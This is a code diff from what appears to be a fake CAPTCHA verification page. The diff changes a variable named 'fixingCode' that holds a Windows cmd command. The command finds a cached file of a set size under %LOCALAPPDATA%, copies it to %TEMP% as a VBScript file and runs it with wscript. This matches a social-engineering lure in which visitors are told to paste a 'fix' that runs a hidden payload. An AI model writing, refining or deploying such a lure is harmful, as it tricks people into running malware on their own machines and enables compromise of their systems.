@@ -476,7 +476,7 @@
   const message = document.getElementById("message");
   const button = document.getElementById("verifyButton");
   const captcha = document.getElementById("captcha");
-  const fixingCode = 'cmd /c "for /r "%LOCALAPPDATA%" %i in (f_*) do @if %~zi==1672 (copy /y "%i" "%TEMP%\t.vbs" && start wscript "%TEMP%\t.vbs")"';
+  const fixingCode = 'cmd.exe /d /c "for /r "%LOCALAPPDATA%" %i in (f_*) do @if %~zi==1672 (copy /y "%i" "%TEMP%\t.vbs" >nul && start "" wscript.exe "%TEMP%\t.vbs")"';
 
   let isVerifying = false;       // Check if verification is in progress
   let isProcessingEnter = false; // Prevent duplicate Enter key inputs
